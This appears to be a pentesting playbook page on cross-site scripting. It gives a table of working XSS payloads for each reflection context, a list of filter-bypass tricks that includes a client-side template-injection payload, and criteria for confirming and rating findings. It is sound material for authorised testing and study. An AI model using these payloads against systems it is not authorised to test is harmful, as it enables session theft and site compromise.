# Cross-site scripting

**When:** a request value reappears in the response. Reflected (this
response), stored (another page later), DOM (JS sink). `probe_reflection`
places a canary and reports the context + which metacharacters survive.

## Read the context before choosing payload

| Reflected inside | Minimal payload |
|---|---|
| HTML text | `<svg/onload=alert(1)>` or `<img src=x onerror=alert(1)>` |
| Double-quoted attribute | `"><svg/onload=alert(1)>` or `" onfocus=alert(1) autofocus="` |
| Single-quoted attribute | `'><svg/onload=alert(1)>` |
| Inside `<script>` string | `';alert(1)//` or `</script><svg/onload=alert(1)>` |
| `javascript:` URL / href | `javascript:alert(1)` |
| Inside HTML comment | `--><svg/onload=alert(1)>` |

If `<` and `>` arrive escaped but quotes do not: attribute breakout only.
If nothing escapes: the input is dead for XSS - move on, do not brute force.

## Real pentest payload vs CTF

`alert(1)` proves execution. For a report, a *unique* marker is better:
`alert(document.domain)` proves origin; a canary cookie read is stronger but
only when in-scope and non-invasive. Stored XSS: submit the payload where it
persists, then READ the page that renders it - the finding is only confirmed
when the stored value executes in a viewing context.

## Filter bypasses

- Case/nesting: `<ScRiPt>`, `<scr<script>ipt>` (naive strip-once filters)
- Event handlers over script tags: `onload`, `onerror`, `onfocus`+`autofocus`
- Tag alternatives: `<svg>`, `<img>`, `<details open ontoggle=...>`, `<body>`
- Escaped context: JS string context needs only `'`/`"`/`;`/`//` - no angle brackets
- `javascript:` scheme in hrefs and form actions
- Angular/Vue templates: `{{constructor.constructor('alert(1)')()}}` when the
  app evaluates client templates

## Falsifier

The canary is absent from the response, or arrives fully entity-encoded in
every context. For stored: the rendering page shows the literal payload text.

## Severity guide

Reflected XSS needing no interaction: medium. Stored XSS: medium-high.
Session-cookie theft demonstrated or admin-viewed stored XSS: high.
Self-XSS (only affects the submitter): low at best - say so honestly.
